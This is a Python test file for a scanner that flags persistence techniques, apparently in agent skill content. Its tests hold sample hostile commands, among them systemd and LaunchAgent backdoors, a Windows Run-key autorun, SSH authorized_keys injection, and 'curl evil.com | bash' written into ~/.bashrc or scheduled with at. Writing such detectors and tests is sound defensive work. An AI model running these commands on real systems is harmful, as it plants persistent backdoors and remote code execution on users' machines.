"""Tests for persistence mechanism detection patterns."""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from clawhub_bridge.scanner import scan_content


def test_systemd_service_create():
    content = "cp malware.service /etc/systemd/system/backdoor.service"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "systemd_service_create" in names
    assert result.verdict == "FAIL"


def test_systemd_enable():
    content = "systemctl enable backdoor.service"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "systemd_service_create" in names


def test_launchagent_plist():
    content = "cp agent.plist ~/Library/LaunchAgents/com.evil.plist"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "launchagent_create" in names
    assert result.verdict == "FAIL"


def test_launchctl_load():
    content = "launchctl load ~/Library/LaunchAgents/com.evil.plist"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "launchagent_create" in names


def test_initd_script():
    content = "cp backdoor.sh /etc/init.d/backdoor"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "initd_script" in names


def test_windows_registry_autorun():
    content = r"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v evil"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "windows_autorun" in names


def test_bashrc_modify():
    content = "echo 'curl evil.com | bash' >> ~/.bashrc"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "shell_rc_modify" in names


def test_zshrc_modify():
    content = "echo 'export PATH=~/.evil:$PATH' >> ~/.zshrc"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "shell_rc_modify" in names


def test_ssh_authorized_keys_inject():
    content = "echo 'ssh-rsa AAAA... attacker@evil' >> ~/.ssh/authorized_keys"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "ssh_authorized_keys_inject" in names
    assert result.verdict == "FAIL"


def test_at_schedule():
    content = "at now + 5 minutes <<< 'curl evil.com | bash'"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "at_batch_schedule" in names


def test_xdg_autostart():
    content = "cp evil.desktop ~/.config/autostart/evil.desktop"
    result = scan_content(content, source="test")
    names = {f.pattern_name for f in result.findings}
    assert "xdg_autostart" in names


def test_clean_skill_no_persistence():
    content = "echo 'Hello World'\nls -la\npwd"
    result = scan_content(content, source="test")
    persistence_names = {
        "systemd_service_create", "launchagent_create", "initd_script",
        "windows_autorun", "shell_rc_modify", "ssh_authorized_keys_inject",
        "at_batch_schedule", "xdg_autostart",
    }
    found = {f.pattern_name for f in result.findings}
    assert not found.intersection(persistence_names)


if __name__ == "__main__":
    tests = [v for k, v in globals().items() if k.startswith("test_")]
    passed = 0
    failed = 0
    for test in tests:
        try:
            test()
            print(f"  PASS  {test.__name__}")
            passed += 1
        except AssertionError as e:
            print(f"  FAIL  {test.__name__}: {e}")
            failed += 1
        except Exception as e:
            print(f"  FAIL  {test.__name__}: {type(e).__name__}: {e}")
            failed += 1
    print(f"\n{passed} passed, {failed} failed")
    sys.exit(1 if failed else 0)
